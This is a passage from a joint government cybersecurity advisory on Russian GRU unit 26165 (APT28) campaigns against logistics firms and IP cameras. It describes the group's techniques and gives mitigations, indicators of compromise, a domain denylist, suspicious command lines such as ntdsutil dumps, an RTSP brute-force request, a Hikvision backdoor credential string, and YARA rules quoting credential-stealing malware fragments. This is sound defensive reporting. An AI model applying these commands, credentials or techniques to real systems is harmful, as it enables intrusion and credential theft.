information from the Active Directory. The actors installed python [T1059.006] on infected machines to enable the execution of Certipy. Accessed files were archived in .zip files prior to exfiltration [T1560]. The actors attempted to exfiltrate archived data via a previously dropped OpenSSH binary [T1048]. Incident response investigations revealed that the actors would take steps to locate and exfiltrate lists of Office 365 users and set up sustained email collection. The actors used manipulation of mailbox permissions [T1098.002] to establish sustained email collection at compromised logistics entities, as detailed in a Polish Cybercommand blog. [6] After initial authentication, unit 26165 actors would change accounts' folder permissions and enroll compromised accounts in MFA mechanisms to increase the trust-level of compromised accounts and enable sustained access [T1556.006]. The actors leveraged python scripts to retrieve plaintext passwords via Group Policy Preferences [T1552.006] using Get-GPPPassword.py and a modified ldap-dump.py to enumerate the Windows environment [T1087.002] and conduct a brute force password spray [T1110.003] via Lightweight Directory Access Protocol (LDAP). The actors would additionally delete event logs through the wevtutil utility [T1070.001]. After gaining initial access to the network, the actors pursued further access to accounts with access to sensitive information on shipments, such as train schedules and shipping manifests. These accounts contained information on aid shipments to Ukraine, including:  sender,   recipient, train/plane/ship numbers,  point of departure,  destination,  container registration numbers, U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 7 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR  travel route, and  cargo contents. In at least one instance, the actors attempted to use voice phishing [T1566.004] to gain access to privileged accounts by impersonating IT staff. Malware Unit 26165’s use of malware in this campaign ranged from gaining initial access to establishing persistence and exfiltrating data. In some cases, the attack chain resulted in multiple pieces of malware being deployed in succession. The actors used dynamic link library (DLL) search order hijacking [T1574.001] to facilitate malware execution. There were a number of known malware variants tied to this campaign against logistics sector victims, including:  HEADLACE [7]  MASEPIE [8] While other malware variants, such as OCEANMAP and STEELHOOK, [8] were not directly observed targeting logistics or IT entities, their deployment against victims in other sectors in Ukraine and other Western countries suggest that they could be deployed against logistics and IT entities should the need arise. Persistence In addition to the abovementioned mailbox permissions abuse, unit 26165 actors also used scheduled tasks [T1053.005], run keys [T1547.001], and placed malicious shortcuts [T1547.009] in the startup folder to establish persistence. Exfiltration GRU unit 26165 actors used a variety of methods for data exfiltration that varied based on the victim environment, including both malware and living off the land binaries. PowerShell commands [T1059.001] were often used to prepare data for exfiltration; for example, the actors prepared zip archives [T1560.001] for upload to their own infrastructure. The actors also used server data exchange protocols and Application Programming Interfaces (APIs) such as Exchange Web Services (EWS) and Internet Message Access Protocol (IMAP) [T1114.002] to exfiltrate data from email servers. In multiple U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 8 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR instances, the actors used periodic EWS queries [T1119] to collect new emails sent and received since the last data exfiltration [T1029]. The actors typically used infrastructure in close geographic proximity to the victim. Long gaps between exfiltration, the use of trusted and legitimate protocols, and the use of local infrastructure allowed for long-term collection of sensitive data to go undetected. Connections to Targeting of IP Cameras In addition to targeting logistics entities, unit 26165 actors likely used access to private cameras at key locations, such as near border crossings, military installations, and rail stations, to track the movement of materials into Ukraine. The actors also used legitimate municipal services, such as traffic cams. The actors targeted Real Time Streaming Protocol (RTSP) servers hosting IP cameras primarily located in Ukraine as early as March 2022 in a large-scale campaign, which included attempts to enumerate devices [T1592] and gain access to the cameras’ feeds [T1125]. Actor-controlled servers sent RTSP DESCRIBE requests destined for RTSP servers, primarily hosting IP cameras [T1090.002]. The DESCRIBE requests were crafted to obtain access to IP cameras located on logically distinct networks from that of the routers that received the request. The requests included Base64-encoded credentials for the RTSP server, which included publicly documented default credentials and likely generic attempts to brute force access to the devices [T1110]. An example of an RTSP request is shown in Figure 1Figure 3. DESCRIBE rtsp://[IP ADDRESS] RTSP/1.0 CSeq: 1 Authorization: Basic <Base64-encoded credentials> User-Agent: WebClient Accept: application/sdp DESCRIBE rtsp://[IP ADDRESS] RTSP/1.0 CSeq: 2 Authorization: Digest username=""admin"", realm=""[a-f0-9]{12}"", algorithm=""MD5"", nonce=""[a-f0- 9]{32}"", uri="""", response=""[a-f0-9]{32}"" User-Agent: WebClient Accept: application/sdp Figure 3: Example RTSP request U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 9 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Successful RTSP 200 OK responses contained a snapshot of the IP camera's image and IP camera metadata such as video codec, resolution, and other properties depending on the IP camera's configuration. From a sample available to the authoring agencies of over 10,000 cameras targeted via this effort, the geographic distribution of victims showed a strong focus on cameras in Ukraine and border countries, as shown in Table 1: Table 1: Geographic distribution of targeted IP cameras Country Ukraine Romania Poland Hungary Slovakia Others Percentage of Total Attempts 81.0% 9.9% 4.0% 2.8% 1.7% 0.6% Mitigation Actions General Security Mitigations Architecture and Configuration  Employ appropriate network segmentation [D3-NI] and restrictions to limit access and utilize additional attributes (such as device information, environment, and access path) when making access decisions [D3-AMED].  Consider Zero Trust principles when designing systems. Base product choices on how those products can solve specific risks identified as part of the end-to-end design. [9]  Ensure that host firewalls and network security appliances (e.g., firewalls) are configured to only allow legitimately needed data flows between devices and servers to prevent lateral movement [D3-ITF]. Alert on attempts to connect laterally between host devices or other unusual data flows.  Use automated tools to audit access logs for security concerns and identify anomalous access requests [D3-RAPA].  For organizations using on-premises authentication and email services, block and alert on NTLM/SMB requests to external infrastructure [D3-OTF]. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 10 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR  Utilize endpoint, detection, and response (EDR) and other cybersecurity solutions on all systems, prioritizing high value systems with large amounts of sensitive data such as mail servers and domain controllers [D3-PM] first.  Perform threat and attack modeling to understand how sensitive systems may be compromised within an organization’s specific architecture and security controls. Use this to develop a monitoring strategy to detect compromise attempts and select appropriate products to enact this strategy.  Collect and monitor Windows logs for certain events, especially for events that indicate that a log was cleared unexpectedly [D3-SFA].  Enable optional security features in Windows to harden endpoints and mitigate initial access techniques [D3-AH]:  Enable attack surface reduction rules to prevent executable content from email [D3-ABPI].  Enable attack surface reduction rules to prevent execution of files from globally writeable directories, such as Downloads or %APPDATA% [D3- EAL].  Unless users are involved in the development of scripts, limit the local execution of scripts (such as batch scripts, VBScript, JScript/JavaScript, and PowerShell [10]) to known scripts [D3-EI], and audit execution attempts.  Disable Windows Host Scripting functionality and configure PowerShell to run in Constrained mode [D3-ACH].  Where feasible, implement allowlisting for applications and scripts to limit execution to only those needed for authorized activities, blocking all others by default [D3- EAL].  Consider using open source SIGMA rules as a baseline for detecting and alerting on suspicious file execution or command parameters [D3-PSA].  Use services that provide enhanced browsing services and safe link checking [D3- URA]. Significant reductions in successful spearphishing attempts were noted when email providers began offering link checking and automatic file detonation to block malicious content.  Where possible, block logins from public VPNs, including exit nodes in the same country as target systems, or, if they need to be allowed, alert on them for further U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 11 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR investigation. Most organizations should not need to allow incoming traffic, especially logins to systems, from VPN services [D3-NAM].  Educate users to only use approved corporate systems for relevant government and military business and avoid the use of personal accounts on cloud email providers to conduct official business. Network administrators should also audit both email and web request logs to detect such activity. Many organizations may not need to allow outgoing traffic to hosting and API mocking services, which are frequently used by GRU unit 26165. Organizations should consider alerting on or blocking the following services, with exceptions allowlisted for legitimate activity [D3-DNSDL].  *.000[.]pe  *.1cooldns[.]com  *.42web[.]io  *.4cloud[.]click  *.accesscan[.]org  *.bumbleshrimp[.]com  *.camdvr[.]org  *.casacam[.]net  *.ddnsfree[.]com  *.ddnsgeek[.]com  *.ddnsguru[.]com  *.dynuddns[.]com  *.dynuddns[.]net  *.free[.]nf  *.freeddns[.]org  *.frge[.]io  *.glize[.]com  *.great-site[.]net  *.infinityfreeapp[.]com  *.kesug[.]com  *.loseyourip[.]com  *.lovestoblog[.]com  *.mockbin[.]io  *.mockbin[.]org  *.mocky[.]io  *.mybiolink[.]io  *.mysynology[.]net  *.mywire[.]org  *.ngrok[.]io  *.ooguy[.]com  *.pipedream[.]net  *.rf[.]gd  *.urlbae[.]com  *.webhook[.]site  *.webhookapp[.]com  *.webredirect[.]org  *.wuaze[.]com Heuristic detections for web requests to new subdomains, including of the above providers, may uncover malicious phishing activity [D3-DNRA]. Logging the requests for each sub-domain requested by users on a network, such as in DNS or firewall logs, may enable system administrators to identify new targeting and victims. Identity and Access Management Organizations should take measures to ensure strong access controls and mitigate against common credential theft techniques:  Use MFA with strong factors, such as passkeys or PKI smartcards, and require regular re-authentication [D3-MFA]. [11], [12] Strong authentication factors are not guessable using dictionary techniques, so they resist brute force attempts. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 12 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR  Implement other mitigations for privileged accounts: including limiting the number of admin accounts, considering using hardware MFA tokens, and regularly reviewing all privileged user accounts [D3-JFAPA].  Separate privileged accounts by role and alert on misuse of privileged accounts [D3- UAP]. For example, email administrator accounts should be different from domain administrator accounts.  Reduce reliance on passwords; instead, consider using services like single sign-on [D3-TBA].  For organizations using on-premises authentication and email services, plan to disable NTLM entirely and migrate to more robust authentication processes such as PKI certificate authentication.  Do not store passwords in Group Policy Preferences (GPP). Remove all passwords previously included in GPP and change all passwords on the corresponding accounts [D3-CH]. [13]  Use account throttling or account lockout [D3-ANET]:  Throttling is preferred to lockout. Throttling progressively increases time delay between successive login attempts.  Account lockout can leave legitimate users unable to access their accounts and requires access to an account recovery process.  Account lockout can provide a malicious actor with an easy way to launch a Denial of Service (DoS). If using lockout, then allowing 5 to 10 attempts before lockout is  recommended.  Use a service to check for compromised passwords before using them [D3-SPP]. For example, “Have I Been Pwned” can be used to check whether a password has been previously compromised without disclosing the potential password.  Change all default credentials [D3-CRO] and disable protocols that use weak authentication (e.g., clear-text passwords or outdated and vulnerable authentication or encryption protocols) or do not support multi-factor authentication [D3-ACH] [D3- ET]. Always configure access controls carefully to ensure that only well-maintained and well-authenticated accounts have access. [13] IP Camera Mitigations The following mitigation techniques for IP cameras can be used to defend against this type of malicious activity: U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 13 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR  Ensure IP cameras are currently supported. Replace devices that are out of support.  Apply security patches and firmware updates to all IP cameras [D3-SU].  Disable remote access to the IP camera, if unnecessary [D3-ITF].  Ensure cameras are protected by a security appliance, if possible, such as by using a firewall to prevent communication with the camera from IP addresses not on an allowlist [D3-NAM].  If remote access to IP camera feeds is required, ensure authentication is enabled [D3-AA] and use a VPN to connect remotely [D3-ET]. Use MFA for management accounts if supported [D3-MFA].  Disable Universal Plug and Play (UPnP), Peer-to-Peer (P2P), and Anonymous Visit features on IP cameras and routers [D3-NI].  Turn off other ports/services not in use (e.g., FTP, web interface, etc.) [D3-ACH].  If supported, enable authenticated RTSP access only [D3-AA].  Review all authentication activity for remote access to make sure it is valid and expected [D3-UBA]. Investigate any unexpected or unusual activity.  Audit IP camera user accounts to ensure they are an accurate reflection of your organization and that they are being used as expected [D3-UAP].  Configure, tune, and monitor logging—if available—on the IP camera. Indicators of Compromise (IOCs) Note: Specific IoCs may no longer be actor controlled, may themselves be compromised infrastructure or email accounts, or may be shared infrastructure such as public VPN or Tor exit nodes. Care should be taken when basing triaging logs or developing detection rules on these indicators. GRU unit 26165 almost certainly uses extensive further infrastructure and TTPs not specifically listed in this report. Utilities and scripts Legitimate utilities Unauthorized or unusual use of the following legitimate utilities can be an indication of a potential compromise:  ntdsutil – A legitimate Windows executable used by threat actors to export contents of Active Directory U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 14 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR  wevtutil – A legitimate Windows executable used by threat actors to delete event logs  vssadmin – A legitimate Windows executable possibly used by threat actors to make a copy of the server’s C: drive  ADexplorer – A legitimate window executable to view, edit, and backup Active Directory Certificate Services  OpenSSH – The Windows version of a legitimate open source SSH client  schtasks – A legitimate Windows executable used to create persistence using scheduled tasks  whoami – A legitimate Windows executable used to retrieve the name of the current user tasklist – A legitimate Windows executable used to retrieve the list of running  processes  hostname – A legitimate Windows executable used to retrieve the device name  arp – A legitimate Windows executable used to retrieve the ARP table for mapping the network environment  systeminfo – A legitimate Windows executable used to retrieve a comprehensive summary of device and operating system information  net – A legitimate Windows executable used to retrieve detailed user information  wmic – A legitimate Windows executable used to interact with Windows Management Instrumentation (WMI), such as to retrieve letters assigned to logical partitions on storage drives  cacls – A legitimate Windows executable used to modify permissions on files  icacls – A legitimate Windows executable used to modify permissions to files and handle integrity levels and ownership  ssh – A legitimate Windows executable used to establish network shell connections  reg – A legitimate Windows executable used to add to or modify the system registry Note: Additional heuristics are needed for effective hunting for these and other living off the land (LOTL) binaries to avoid being overwhelmed by false positives if these legitimate management tools are used regularly. See the joint guide, Identifying and Mitigating Living Off the Land Techniques, for guidance on developing a multifaceted cybersecurity strategy that enables behavior analytics, anomaly detection, and proactive hunting, which are part of a comprehensive approach to mitigating cyber threats that employ LOTL techniques. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 15 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Malicious scripts  Certipy – An open source python tool for enumerating and abusing Active Directory Certificate Services  Get-GPPPassword.py – An open source python script for finding insecure passwords stored in Group Policy Preferences  ldap-dump.py – A script for enumerating user accounts and other information in Active Directory  Hikvision backdoor string: “YWRtaW46MTEK” Suspicious command lines While the following utilities are legitimate, and using them with the command lines shown may also be legitimate, these command lines are often used during malicious activities and could be an indication of a compromise:  edge.exe “-headless-new -disable-gpu”  ntdsutil.exe ""activate instance ntds"" ifm ""create full C:\temp\[a-z]{3}"" quit quit  ssh -Nf  schtasks /create /xml Outlook CVE Exploitation IOCs  md-shoeb@alfathdoor[.]com[.]sa jayam@wizzsolutions[.]com   accounts@regencyservice[.]in  m.salim@tsc-me[.]com  vikram.anand@4ginfosource[.]com  mdelafuente@ukwwfze[.]com  sarah@cosmicgold469[.]co[.]za franch1.lanka@bplanka[.]com   commerical@vanadrink[.]com  maint@goldenloaduae[.]com  karina@bhpcapital[.]com tv@coastalareabank[.]com   ashoke.kumar@hbclife[.]in  213[.]32[.]252[.]221  124[.]168[.]91[.]178  194[.]126[.]178[.]8  159[.]196[.]128[.]120 U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 16 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Commonly Used Webmail Providers  portugalmail[.]pt  mail-online[.]dk  email[.]cz  seznam[.]cz Malicious Archive Filenames Involving CVE-2023-38831  calc.war.zip  news_week_6.zip  Roadmap.zip  SEDE-PV-2023-10-09-1_EN.zip  war.zip  Zeyilname.zip Brute Forcing IP Addresses Disclaimer: These IP addresses date June 2024 through August 2024. The authoring agencies recommend organizations investigate or vet these IP addresses prior to taking action, such as blocking. June 2024 July 2024 192[.]162[.]174[.]94 207[.]244[.]71[.]84 103[.]97[.]203[.]29 162[.]210[.]194[.]2 209[.]14[.]71[.]127 109[.]95[.]151[.]207 31[.]135[.]199[.]145 31[.]42[.]4[.]138 46[.]112[.]70[.]252 46[.]248[.]185[.]236 64[.]176[.]67[.]117 64[.]176[.]69[.]196 64[.]176[.]70[.]18 64[.]176[.]70[.]238 64[.]176[.]71[.]201 70[.]34[.]242[.]220 70[.]34[.]243[.]226 70[.]34[.]244[.]100 70[.]34[.]245[.]215 70[.]34[.]252[.]168 70[.]34[.]252[.]186 70[.]34[.]252[.]222 70[.]34[.]253[.]13 70[.]34[.]253[.]247 August 2024 79[.]184[.]25[.]198 79[.]185[.]5[.]142 83[.]10[.]46[.]174 83[.]168[.]66[.]145 83[.]168[.]78[.]27 91[.]149[.]253[.]204 91[.]149[.]254[.]75 91[.]149[.]255[.]122 91[.]149[.]255[.]19 91[.]149[.]255[.]195 83[.]168[.]78[.]31 83[.]168[.]78[.]55 83[.]23[.]130[.]49 83[.]29[.]138[.]115 89[.]64[.]70[.]69 90[.]156[.]4[.]204 91[.]149[.]202[.]215 178[.]37[.]97[.]243 91[.]221[.]88[.]76 93[.]105[.]185[.]139 95[.]215[.]76[.]209 138[.]199[.]59[.]43 147[.]135[.]209[.]245 178[.]235[.]191[.]182 185[.]234[.]235[.]69 91[.]149[.]203[.]73 192[.]162[.]174[.]67 91[.]149[.]219[.]158 91[.]149[.]219[.]23 194[.]187[.]180[.]20 91[.]149[.]223[.]130 212[.]127[.]78[.]170 213[.]134[.]184[.]167 91[.]149[.]253[.]118 91[.]149[.]253[.]198 70[.]34[.]254[.]245 91[.]149[.]253[.]20 U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 17 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Detections Customized NTLM listener rule APT28_NTLM_LISTENER { meta: description = ""Detects NTLM listeners including APT28's custom one"" strings: $command_1 = ""start-process powershell.exe -WindowStyle hidden"" $command_2 = ""New-Object System.Net.HttpListener"" $command_3 = ""Prefixes.Add('http://localhost:8080/')"" $command_4 = ""-match 'Authorization'"" $command_5 = ""GetValues('Authorization')"" $command_6 = ""Request.RemoteEndPoint.Address.IPAddressToString"" $command_7 = ""@(0x4e,0x54,0x4c,0x4d, 0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x28,0x00,0x00,0x01,0x82,0x00 ,0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)"" $command_8 = "".AllKeys"" $variable_1 = ""$NTLMAuthentication"" nocase $variable_2 = ""$NTLMType2"" nocase $variable_3 = ""$listener"" nocase $variable_4 = ""$hostip"" nocase $variable_5 = ""$request"" nocase $variable_6 = ""$ntlmt2"" nocase $variable_7 = ""$NTLMType2Response"" nocase $variable_8 = ""$buffer"" nocase condition: 5 of ($command_*) or all of ($variable_*) } U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 18 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR HEADLACE shortcut rule APT28_HEADLACE_SHORTCUT { meta: description = ""Detects the HEADLACE backdoor shortcut dropper. Rule is meant for threat hunting."" strings: $type = ""[InternetShortcut]"" ascii nocase $url = ""file://"" $edge = ""msedge.exe"" $icon = ""IconFile"" condition: all of them } HEADLACE credential dialogbox phishing rule APT28_HEADLACE_CREDENTIALDIALOG { meta: credentials"" description = ""Detects scripts used by APT28 to lure user into entering strings: $command_1 = ""while($true)"" $command_2 = ""Get-Credential $(whoami)"" $command_3 = ""Add-Content"" $command_4 = "".UserName"" $command_5 = "".GetNetworkCredential().Password"" $command_6 = ""GetNetworkCredential().Password.Length -ne 0"" condition: 5 of them } U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 19 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR HEADLACE core script rule APT28_HEADLACE_CORE { meta: description = ""Detects HEADLACE core batch scripts"" strings: $chcp = ""chcp 65001"" ascii $headless = ""start \""\"" msedge --headless=new --disable-gpu"" ascii $command_1 = ""taskkill /im msedge.exe /f"" ascii $command_2 = ""whoami>\""%programdata%"" ascii $command_3 = ""timeout"" ascii $command_4 = ""copy \""%programdata%\\"" ascii $non_generic_del_1 = ""del /q /f \""%programdata%"" ascii $non_generic_del_3 = ""del /q /f \""%userprofile%\\Downloads\\"" ascii $generic_del = ""del /q /f"" ascii condition: ( $chcp and $headless ) and ( ) 1 of ($non_generic_del_*) or ($generic_del) or 3 of ($command_*) } U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 20 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR MASEPIE rule APT28_MASEPIE { meta: description = ""Detects MASEPIE python script"" strings: $masepie_unique_1 = ""os.popen('whoami').read()"" $masepie_unique_2 = ""elif message == 'check'"" $masepie_unique_3 = ""elif message == 'send_file':"" $masepie_unique_4 = ""elif message == 'get_file'"" $masepie_unique_5 = ""enc_mes('ok'"" $masepie_unique_6 = ""Bad command!'.encode('ascii'"" $masepie_unique_7 = ""{user}{SEPARATOR}{k}"" $masepie_unique_8 = ""raise Exception(\""Reconnect"" condition: 3 of ($masepie_unique_*) } STEELHOOK rule APT28_STEELHOOK { meta: description = ""Detects APT28's STEELHOOK powershell script"" strings: $s_1 = ""$($env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Local State)"" $s_2 = ""$($env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data)"" $s_3 = ""$($env:LOCALAPPDATA\\\\Microsoft\\\\Edge\\\\User Data\\\\Local State)"" $s_4 = ""$($env:LOCALAPPDATA\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data)"" $s_5 = ""os_crypt.encrypted_key"" $s_6 = ""System.Security.Cryptography.DataProtectionScope"" $s_7 = ""[system.security.cryptography.protectdata]::Unprotect"" $s_8 = ""Invoke-RestMethod"" condition: all of them } U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 21 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR PSEXEC rule GENERIC_PSEXEC { meta: description = ""Detects SysInternals PSEXEC executable"" strings: $sysinternals_1 = ""SYSINTERNALS SOFTWARE LICENCE TERMS"" $sysinternals_2 = ""/accepteula"" $sysinternals_3 = ""Software\\Sysinternals"" $network_1 = ""\\\\%s\\IPC$"" $network_2 = ""\\\\%s\\ADMIN$\\%s"" $network_3 = ""\\Device\\LanmanRedirector\\%s\\ipc$"" $psexec_1 = ""PSEXESVC"" $psexec_2 = ""PSEXEC-{}-"" $psexec_3 = ""Copying %s to %s..."" $psexec_4 = ""gPSINFSVC"" condition: ( ) and and ( ) } ( uint16( 0x0 ) ==0x5a4d ) and ( uint16( uint32( 0x3c )) == 0x4550 ) filesize < 1024KB ( any of ($sysinternals_*) and any of ($psexec_*) ) or ( 2 of ($network_*) and 2 of ($psexec_*)) U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 22 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Cybersecurity Industry Tracking The cybersecurity industry provides overlapping cyber threat intelligence, IOCs, and mitigation recommendations related to GRU unit 26165 cyber actors. While not all encompassing, the following are the most notable threat group names related under MITRE ATT&CK G0007 and commonly used within the cybersecurity community:  APT28 [14]  Fancy Bear [14]  Forest Blizzard [14]  Blue Delta [15] Note: Cybersecurity companies have different methods of tracking and attributing cyber actors, and this may not be a 1:1 correlation to the U.S. government’s understanding for all activity related to these groupings. Further Reference To search for the presence of malicious email messages targeting CVE-2023-23397, network defenders may consider using the script published by Microsoft: https://aka.ms/CVE-2023-23397ScriptDoc. For the Impacket TTP, network defenders may consider using the following publicly available Impacket YARA detection rule: https://github.com/Neo23x0/signature-base/blob/master/yara/gen_impacket_tools.yar Works Cited [1] Microsoft. Defending Ukraine: Early Lessons from the Cyber War. 2022. https://blogs.microsoft.com/on-the-issues/2022/06/22/defending-ukraine-early-lessons-from-the- cyber-war/ [2] FBI et al. Russian Cyber Actors Use Compromised Routers to Facilitate Cyber Operations. 2024. https://media.defense.gov/2024/Feb/27/2003400753/-1/-1/0/CSA-Russian-Actors-Use-Routers- Facilitate-Cyber_Operations.PDF [3] NSA et al. Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments. 2021. https://media.defense.gov/2021/Jul/01/2002753896/-1/- 1/0/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF [4] ANSSI. Campagnes d'attaques du mode opératoire APT28 depuis 2021. 2023. https://cert.ssi.gouv.fr/cti/CERTFR-2023-CTI-009/ [5] ANSSI, Targeting and compromise of french entities using the APT28 intrusion set. 2025. https://cert.ssi.gouv.fr/cti/CERTFR-2025-CTI-007/ [6] Polish Cyber Command. Detecting Malicious Activity Against Microsoft Exchange Servers. 2023. https://www.wojsko-polskie.pl/woc/articles/aktualnosci-w/detecting-malicious-activity-against- microsoft-exchange-servers/ U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 23 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR [7] IBM. Israel-Hamas Conflict Lures to Deliver Headlace Malware. 2023. https://securityintelligence.com/x-force/itg05-ops-leverage-israel-hamas-conflict-lures-to-deliver- headlace-malware/ [8] CERT-UA. APT28: From Initial Attack to Creating Domain Controller Threats in an Hour. 2023. https://cert.gov.ua/article/6276894 [9] NSA. Embracing a Zero Trust Security Model. 2021. https://media.defense.gov/2021/Feb/25/2002588479/-1/- 1/0/CSI_EMBRACING_ZT_SECURITY_MODEL_UOO115131-21.PDF [10] NSA et al. Keeping PowerShell: Security Measures to Use and Embrace. 2022. https://media.defense.gov/2022/Jun/22/2003021689/-1/- 1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_202206 22.PDF [11] National Institute of Standards and Technology (NIST). Special Publication 800-63B: Digital Identity Guidelines – Authentication and Lifecycle Management. 2020. https://pages.nist.gov/800-63- 3/sp800-63b.html [12] NSA. Selecting Secure Multi-factor Authentication Solutions. October 16, 2020. https://media.defense.gov/2024/Jul/31/2003515137/-1/- 1/0/MULTIFACTOR_AUTHENTICATION_SOLUTIONS_UOO17091520.PDF [13] NSA and CSA. NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations. 2023. https://media.defense.gov/2023/Oct/05/2003314578/-1/- 1/0/JOINT_CSA_TOP_TEN_MISCONFIGURATIONS_TLP-CLEAR.PDF [14] Department of Justice. Justice Department Conducts Court-Authorized Disruption of Botnet Controlled by the Russian Federation’s Main Intelligence Directorate of the General Staff (GRU). 2024. https://www.justice.gov/archives/opa/pr/justice-department-conducts-court-authorized- disruption-botnet-controlled-russian [15] Recorded Future. GRU’s BlueDelta Targets Key Networks in Europe with Multi-Phase Espionage Campaigns. 2024. https://go.recordedfuture.com/hubfs/reports/CTA-RU-2024-0530.pdf Disclaimer of endorsement The information and opinions contained in this document are provided ""as is"" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes. Purpose This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including their responsibilities to identify and disseminate threats and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 24 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Contact United States organizations  National Security Agency (NSA) Cybersecurity Report Feedback: CybersecurityReports@nsa.gov Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov Media Inquiries / Press Desk: NSA Media Relations: 443-634-0721, MediaRelations@nsa.gov  Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) U.S. organizations are encouraged to reporting suspicious or criminal activity related to information in this advisory to CISA via the agency’s Incident Reporting System, its 24/7 Operations Center (report@cisa.gov or 888-282-0870), or your local FBI field office. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment user for the activity; the name of the submitting company or organization; and a designated point of contact.  Department of Defense Cyber Crime Center (DC3) Defense Industrial Base Inquiries and Cybersecurity Services: DC3.DCISE@us.af.mil Media Inquiries / Press Desk: DC3.Information@us.af.mil United Kingdom organizations  Report significant cyber security incidents to ncsc.gov.uk/report-an-incident (monitored 24/7) Germany organizations  Bundesnachrichtendienst (BND): Media Relations / Press Desk: +49 30 20 45 36 30, pressestelle@bnd.bund.de  BfV Prevention/Economic Protection Unit: +49 30 18792-3322, wirtschaftsschutz@bfv.bund.de  BSI Service-Center: +49 800 274 1000, service-center@bsi.bund.de Czech Republic organizations  Security Information Service (BIS): cyber.threats@bis.cz  National Cyber and Information Security Agency (NÚKIB): cert.incident@nukib.gov.cz Poland organizations  Poland Military Counterintelligence Service (SKW): cyber.int@skw.gov.pl Australian organizations  Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories. Canadian organizations  Report incidents by emailing CCCS at contact@cyber.gc.ca. Estonia organizations  Estonian Foreign Intelligence Service (EFIS): info@valisluureamet.ee  Estonian National Cyber Security Centre (NCSC-EE): ria@ria.ee French organizations  French organizations are encouraged to report suspicious activity or incident related to information found in this advisory by contacting ANSSI/CERT-FR by email at cert-fr@ssi.gouv.fr or by phone at: 3218 or +33 9 70 83 32 18. U/OO/157019-25 | PP-25-2107 | May 2025 Ver. 1.0 TLP:CLEAR 25 Russian GRU Targeting Western Logistics Entities and Technology Companies TLP:CLEAR Appendix A: MITRE ATT&CK tactics and techniques See Table 2 through Table 14 for all the threat actor tactics and techniques referenced in this advisory. Table 2: Reconnaissance Tactic/Technique Title ID Use Reconnaissance TA0043 Gather Victim Identity Information: Email Addresses T1589.002 Gather Victim Org Information T1591 Gather Victim Org Information: Identify Roles T1591.004 Conducted reconnaissance on at least one entity involved in the production of ICS components for railway management. Conducted contact information reconnaissance to identify additional targets in key positions. Conducted reconnaissance of the cybersecurity department. Conducted reconnaissance of individuals responsible for coordinating transport. Gather Victim Org Information: Business Relationships T1591.002 Conducted reconnaissance of other companies cooperating with the victim entity. Gather Victim Host Information T1592 Attempted to enumerate Real Time Streaming Protocol (RTSP) servers hosting IP cameras. Table 3: Resource development Tactic/Technique 